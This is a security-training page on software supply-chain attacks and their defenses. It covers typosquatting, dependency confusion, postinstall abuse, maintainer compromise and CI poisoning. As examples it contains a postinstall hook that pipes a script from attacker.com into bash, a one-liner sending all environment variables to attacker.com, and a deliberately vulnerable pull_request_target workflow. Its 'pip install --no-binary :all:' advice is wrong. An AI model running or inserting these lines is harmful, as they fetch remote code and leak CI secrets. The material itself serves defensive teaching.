📦 Supply-Chain Attacks

Modern applications pull in hundreds of third-party packages, dozens of GitHub Actions, and a handful of base container images — each one a foothold the application owner does not control. Supply-chain attacks compromise the artifact before it ever reaches the developer's machine: a typosquat that gets installed during a late-night refactor, a maintainer's npm token leaked from a public repo, a postinstall script that runs the moment npm install fires. By the time a vulnerability hits production, the malicious code has already executed in CI, on every developer laptop, and in every customer's runtime. This page covers the five attack patterns you should test for and the tooling that catches them.

⚠ Scope & ethics

Most supply-chain testing during a pentest is read-only — auditing the target's installed dependency tree, lockfile, and CI workflow files. Do not publish proof-of-concept packages to npm / PyPI / Maven Central with names that resemble the target's internal packages, even with benign payloads — those package names live on those registries forever and become a real liability for someone else. Reproduce dependency-confusion findings inside an isolated registry mirror you control (Verdaccio, devpi). Action-poisoning PoCs likewise belong in a private fork, never against the public action. If you must demonstrate execution, use a dedicated victim repo and clearly tagged callbacks.

1🎭 Typosquatting

One typo and you install the attacker's package. The big language registries — npm, PyPI, RubyGems, Maven Central, Docker Hub, crates.io — all let anyone register any not-yet-claimed name. Most do not enforce confusable-name rules, do not require email confirmation for first publish, and (critically) run install-time scripts by default. A developer racing through a Friday-afternoon refactor types npm install requets instead of requests, hits enter, and an attacker now has code execution on their workstation.

The attacks land most often when a name is almost right: one transposed character (lodahs vs lodash), a missing letter (requets), an added one (electorn), a homoglyph (reаct with a Cyrillic а), or — peculiarly common when developers context-switch across ecosystems — a name that's correct in the wrong registry (python-django on PyPI when django is what you wanted, or requests typed into npm install when it's a Python package). Attackers monitor the npm registry's public new-packages feed, register confusable names against the top-1000 download list, and wait.

Real incidents to anchor the threat. The event-stream compromise in 2018 was technically maintainer transfer rather than typosquat, but it injected a Bitcoin-wallet stealer into a package depended on by 8 million weekly installs. colors.js and faker.js in early 2022 were sabotaged by their own maintainer with an infinite-loop denial-of-service — every CI in the world that pinned to a range tag broke overnight. The npm registry sees several typosquat takedowns every week; PyPI is similar. And the scoped-vs-unscoped confusion (@types/express vs types-express) is a special case: scoped names live in a per-org namespace nobody else can publish into, so attackers register the unscoped lookalike and wait for a careless install command.

# Look like the real thing — one character difference
npm install lodahs        # not lodash
npm install requets       # not requests (popular Python typo to npm)
npm install electorn      # not electron
pip install python-django # not django
pip install crypt         # not crypto

When you're auditing a target's lockfile, the question is the same one the attacker asks: does anything in here look almost like a more popular package? Pull the top dependencies, check publish age and download counts, and look at the maintainer history. A package with 12 weekly downloads, published two weeks ago, by an account with no other projects, is suspicious — especially if a 100M-download lookalike name is one Levenshtein distance away.

# Investigate before installing — first downloads, age, maintainer
npm view lodash         # check the real one
npm view lodahs         # likely shows: low downloads, recent publish, suspicious
npm audit --omit=dev    # scan installed deps

Defenses that work: pin every dependency to an exact version (no ^ or ~ ranges) and check the lockfile (package-lock.json, poetry.lock, Pipfile.lock, Gemfile.lock, go.sum) into version control. Run npm audit, pip-audit, or an OSV-scanner job in CI on every PR. Front your registry with a private mirror (Verdaccio, JFrog Artifactory, AWS CodeArtifact) configured to only proxy an explicit allowlist of upstream packages — the moment a developer typos a name, the install fails fast instead of pulling a malicious lookalike. Pair that with developer education on the scoped-package convention.

2🪞 Dependency confusion

An internal package name accidentally claimed on a public registry. Discovered in 2021 by Alex Birsan (who used it to ring telephone-numbered bug bounties at Apple, Microsoft, PayPal, Tesla, Uber, and dozens more), this is the textbook supply-chain bug for any company that publishes private packages. Default package-manager resolution prefers the higher version number, and a public registry's 99.99.99 always beats a private registry's 1.4.2.

The attacker's recon is dead simple. They scrape a leaked package.json from a public GitHub repo, a stack-trace dumped to a public log, an old NPM 404 error message, or a JS bundle served from the target's marketing site (which often inlines internal dependency names as part of webpack's chunk graph). They note that the company uses an internal package acme-billing-utils, find that name is unclaimed on public npm, register it, publish a version with version number 99.99.99, add a postinstall that beacons home with the hostname and environment, and wait. The next time misconfigured CI runs npm install with npm's default behavior of "fall back to public registry on miss," it pulls and executes the attacker's code with whatever credentials CI happens to hold.

// Leaked package.json giveaway — internal package without scope
{
  "dependencies": {
    "acme-billing-utils": "^1.2.3",      // <-- attacker registers this on npm
    "@acme/auth": "^2.0.0"               // scoped — much harder to hijack
  }
}

The "highest version wins" rule is the kill shot. There is no security check; npm and pip do not verify that a private package and a public package with the same name are even from the same publisher. They just resolve to the higher SemVer.

# Attacker's registration on public npm
npm publish acme-billing-utils  # version: 99.99.99 (highest wins)

The vulnerable CI is the one that runs npm install (or pip install -r requirements.txt, or mvn install) without explicit registry configuration. The fix is to pin the registry to your internal mirror and refuse to fall back to the public registry for known-internal names — either in CI environment variables, a checked-in .npmrc / pip.conf, or a Verdaccio config that fails closed for unknown packages.

# Vulnerable CI config — pulls from public npm by default
- run: npm install
# Mitigation: use --registry or a .npmrc that points to internal mirror
- run: npm install --registry=https://npm.acme.internal

How to test for it on a real target. Identify candidate internal package names from anywhere they leak: the marketing-site JS bundle, public GitHub repos belonging to the org or its employees, expired or 404'd npm pages (the npm registry returns a different error for "never existed" vs "deleted"), and stack traces in public crash dumps. Cross-reference each candidate against npm / PyPI / Maven Central — anything unclaimed is a finding. Report it without publishing the squat.

Defenses: use scoped packages (@acme/billing-utils) for everything internal — the @acme scope is owned by you on the public registry, so nobody else can publish into it. Run a private registry mirror with an allowlist of upstream packages, and make every developer / CI workflow point at it via a checked-in .npmrc. Use npm install --strict-peer-deps and --ignore-scripts in CI. Maintain separate dev / prod registries with stricter rules on prod. Tools like dependency-check, Snyk, and Socket.dev's npm package both flag dependency-confusion candidates automatically when added to CI.

3⚙ Postinstall script abuse

npm runs scripts.postinstall automatically as part of npm install. Same for preinstall, install, prepare, preuninstall, and a handful of others. PyPI does the equivalent through setup.py running on install, and Ruby's Gem::Specification does it through extconf.rb hooks. The result: every npm install against a fresh tree is implicit code execution from every transitive dependency in the tree. Cryptomining, environment-variable exfil, persistence on the developer's laptop, and SSH-key theft are all just one postinstall field away — and they happen before any of your security tooling has a chance to scan the code.

// Malicious package.json
{
  "name": "useful-utility",
  "version": "1.0.0",
  "scripts": {
    "postinstall": "curl -fsSL https://attacker.com/install.sh | bash"
  }
}

The most common payload, by a wide margin, is environment-variable exfil. Why? Because in CI the environment is full of secrets — AWS keys, GitHub tokens, npm publish tokens, Datadog API keys, Slack webhooks, signing keys, deploy SSH keys. A two-line beacon dumps the lot back to the attacker, who then has cloud-account access without ever needing to escalate locally:

# Exfil env vars (commonly contain CI secrets, AWS keys, GitHub tokens)
node -e "require('https').request('https://attacker.com/?d='+Buffer.from(JSON.stringify(process.env)).toString('base64')).end()"

The defense is to disable lifecycle scripts at install time and only re-enable them for the small set of packages you've explicitly vetted (typically native-extension builds like node-sass, sharp, or better-sqlite3). The --ignore-scripts flag does this per invocation; setting it in ~/.npmrc or a project-level .npmrc makes it the default for everyone. Pip's equivalent is preferring wheels and pinning hashes — when you only install pre-built wheels, the setup.py never runs:

# Defense: install without running scripts
npm install --ignore-scripts                    # global default
pip install --no-binary :all: --require-hashes  # py equivalent

# Or set globally in ~/.npmrc
echo "ignore-scripts=true" >> ~/.npmrc

There is a real cost: --ignore-scripts breaks packages that do legitimate native-module compilation in their lifecycle hooks (node-sass, sharp, node-gyp-based modules generally). The right pattern is to opt those packages back in by name — either by running their build step manually, or by maintaining an allowlist with @lavamoat/allow-scripts (which only runs scripts for packages you've explicitly approved). The friction of "I added a new dep with a postinstall, do I trust this one?" is the entire point — it surfaces a question that should always be asked.

What to look for during a pentest. If you have access to the target's lockfile, run find node_modules -name package.json -exec jq -r 'select(.scripts.postinstall) | .name + ": " + .scripts.postinstall' {} \; (or the equivalent for the target ecosystem) and read every result by hand. Anything that fetches a remote URL, decodes base64, or invokes node -e / python -c is a finding regardless of intent.

4👤 Compromised maintainer / signed-but-malicious releases

A single compromised npm or PyPI account ships malicious code to billions of installs. The package is "legitimate" — same name, same maintainer in the registry's eyes, same signing key (the attacker stole or reset the credentials) — and the malicious release is signed by an authentic publisher. Defense-in-depth here means assuming any single account can be lost and structuring the system so that one account's compromise is recoverable.

The history is sobering. event-stream (2018): the original maintainer transferred ownership to a stranger who'd "offered to help"; the stranger added a dependency that targeted a single downstream Bitcoin-wallet library and stole keys for a year before being noticed. coa and rc (2021): two separate npm maintainer-credential resets in the same week, both carrying the same crypto-mining payload. node-ipc (2022): the maintainer himself, in protest of the war in Ukraine, added a "protestware" payload that wiped files on hosts geolocated to Russia or Belarus — depended on by vue-cli and millions of installs. ua-parser-js (2021): account compromise; pushed a crypto miner and credential stealer; affected packages with hundreds of millions of weekly downloads. colors.js and faker.js (2022): maintainer self-sabotage with an infinite loop; broke CI everywhere overnight.

Two questions matter when triaging an incident or auditing a tree. First: is this version on a published advisory? Vulnerability scanners pull from OSV, GitHub Advisory Database, npm's own npm audit backend, and PyPI's safety-db, so a quick local audit catches anything publicly disclosed:

# Audit installed packages for known compromises
npm audit
pip-audit
trivy fs ./node_modules
osv-scanner --recursive .

Second: who actually maintains this package, and is anything weird about the publish history? An account with two maintainers is harder to compromise than an account with one; a publish history with a four-year gap followed by three releases in the last week is a screaming red flag. Both are quick to check from the registry directly:

# Check who maintains a package + their other packages
npm view some-package maintainers
npm view some-package time   # publish history; sudden recent versions are suspicious

Also check: does the package use signed releases? npm provenance (rolled out broadly in 2023) lets a publisher cryptographically attest "this tarball was built by GitHub Actions on commit SHA ... in repo ..."; PyPI Trusted Publishing (also OIDC-based) gives the same guarantee. A package with provenance pointing to a public, reproducible build is harder to silently subvert than one pushed from a maintainer's laptop with a long-lived API token.

Defenses: pin every dependency to an exact version (lockfile in version control). Require multi-factor auth on all maintainer accounts of packages you publish. Adopt npm provenance / PyPI Trusted Publishing for your own releases. Verify upstream packages' Sigstore signatures (cosign verify) where available. Run Renovate or Dependabot, but turn auto-merge OFF for any major-version bump or any change to a package not in your reviewed-by-a-human allowlist. Keep an incident-response runbook for "an upstream we depend on just got compromised" — rotation order for affected secrets, what to roll back to, who to notify.

5🔁 GitHub Actions / CI poisoning

CI is the new high-value target. The build system has the credentials to push to npm, deploy to AWS, sign release artifacts, and publish to package registries — secrets a single compromised CI step can exfiltrate or use directly. And because uses: references in GitHub Actions workflows are typically tag-based, a maintainer who can mutate the tag (or compromise the repo to force-push a new SHA at the same tag) ships malicious bytecode to every consumer's next run.

Recent incidents to anchor the threat. tj-actions/changed-files (March 2025): the maintainer's PAT was compromised; the attacker pushed a build that scraped CI runner memory for secrets and exfiltrated them via DNS — depended on by tens of thousands of repos worldwide. reviewdog/action-setup (early 2025): similar pattern, supply-chain push to a popular community action.

The fix is structural: stop trusting tags. A tag like @v44 is a moving pointer — the maintainer can update it, and (more importantly) anyone who compromises the maintainer can update it. A commit SHA is content-addressed; the only way to change what @a284dc18... resolves to is to break SHA-1, which nobody can yet do for an arbitrary collision. Pin every uses: to a 40-character SHA, and use Dependabot's GitHub Actions ecosystem support to receive PRs when a new SHA is published — review them, then merge.

# DON'T: tag references can be silently mutated
- uses: tj-actions/changed-files@v44

# DO: pin to commit SHA
- uses: tj-actions/changed-files@a284dc1814e3fe07e2362b86d8a9e26d9e5bd0b6

The single most dangerous primitive in GitHub Actions is pull_request_target. Unlike pull_request, this trigger runs in the context of the base branch with full access to repository secrets — even when the PR comes from a fork. The intent is to let trusted automation comment on PRs, label them, etc., without giving fork PRs access to secrets. The footgun is that if you also checkout the PR's head SHA and run any code from it (including npm install, which runs postinstall scripts from the PR's package.json), you've handed every drive-by fork-PR opener your AWS keys.

# DANGEROUS: pull_request_target gives the PR access to repo secrets
on:
  pull_request_target:    # <-- runs in trusted context with secrets
    types: [opened, synchronize]
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}  # checks out PR code WITH secrets available
      - run: npm install && npm test                       # PR's package.json scripts run with secrets

The right pattern is the pull_request + workflow_run split. The first workflow runs on pull_request in the untrusted, no-secrets context — it can run tests against the PR code without leaking anything. The second workflow triggers on the first one's completion (workflow_run) and runs in the trusted context with secrets available, but it never executes PR-controlled code. It only consumes safe outputs (test results, artifact metadata) and posts a comment / deploys / signs a build:

# Mitigation: split into 2 workflows
# 1. Untrusted: runs PR code, NO secrets
on: pull_request
# 2. Trusted: only deploys after manual approval, with secrets
on:
  workflow_run:
    workflows: ["Untrusted PR"]
    types: [completed]

Defenses: pin every uses: to a 40-character commit SHA. Never combine pull_request_target with checkout of the PR's head. Minimize Actions secrets — most workflows do not need AWS_SECRET_ACCESS_KEY at all; use OIDC (permissions: id-token: write + aws-actions/configure-aws-credentials) for short-lived, just-in-time cloud auth instead. Require code review on changes to .github/workflows/*. Enable branch protection that requires a CODEOWNERS-approving review for workflow file changes. Audit installed Actions periodically with a tool like action-validator or Stacklok's frizbee.

6🧰 Detection / mitigation tools

Good supply-chain posture is a stack of small tools, each catching a different layer. None individually is a silver bullet; together they catch most of the realistic threat model. The list below is the set worth knowing by name during an engagement — they all have free tiers and integrate into CI in well-documented ways.

  • Syft — SBOM (Software Bill of Materials) generator from container images, filesystems, and lockfiles. The output feeds every other tool on this list. github.com/anchore/syft
  • Grype / Trivy — vulnerability scanners that consume SBOMs (or scan directly) and flag known-vulnerable versions against OSV / NVD / GHSA databases. Trivy also scans Dockerfiles and Kubernetes manifests; both run as a single-binary CI step.
  • Sigstore / cosign — verify cryptographic signatures on release artifacts. The pattern is "publish with cosign sign-blob, verify with cosign verify-blob"; ties an artifact to a specific OIDC identity (e.g. a GitHub Actions workflow at a specific SHA). sigstore.dev
  • npm provenance — opt-in provenance metadata published alongside npm packages when the publish runs from GitHub Actions. npm publish --provenance in a workflow records the commit SHA, workflow file, and runner identity. Verifiable via npm audit signatures.
  • PyPI Trusted Publishing — OIDC-based publish flow for PyPI. Replaces long-lived API tokens with short-lived per-workflow credentials; eliminates the "maintainer's ~/.pypirc got stolen" failure mode entirely.
  • Socket.dev — npm / PyPI / Go / Maven risk-scoring. Flags suspicious behavior (postinstall scripts, network calls, filesystem access, eval usage, typo distance to popular packages) at PR-review time before a dep gets merged. Free for open source.
  • Snyk Open Source / GitHub Advanced Security — paid commercial scanners; broader rule sets than the free tools and tighter integrations with PR workflows. Worth it for teams that ship customer software.
  • Renovate / Dependabot — automated dependency-update PRs. Configure automerge: false for non-trivial bumps, automerge: true only for patch-level updates of pre-vetted packages. Without a human in the loop, these become a supply-chain accelerant rather than a defense.
  • OSV-scanner — Google's open-source universal vuln scanner. Single binary, multi-ecosystem (npm, pip, Go, Maven, Cargo, etc.), cross-references the OSV database. google.github.io/osv-scanner
  • gitleaks / truffleHog — pre-publish secret scanners. Catch the case where a developer accidentally bundles a .env file into an npm package or commits a private key to a public repo. Worth running both in pre-commit hooks and in CI.

7📚 References

  • OWASP Software Component Verification Standard (SCVS) — the canonical maturity model for component-supply-chain security; useful framing for engagement reports.
  • The Update Framework (TUF) — academic-grade design for secure software-update systems; the reference architecture cosign / Sigstore / PyPI's signing all draw from.
  • SLSA framework — Supply-chain Levels for Software Artifacts; Google-led specification for build-provenance maturity (Levels 1–4). The vocabulary most modern enterprise supply-chain programs use.
  • npm provenance docs — the canonical how-to for publishing signed npm packages from GitHub Actions.
  • Backstabber's Knife Collection (Ohm et al., 2020) — academic survey of 174 malicious npm / PyPI / RubyGems packages; the empirical foundation for "what attackers actually do" in this space.
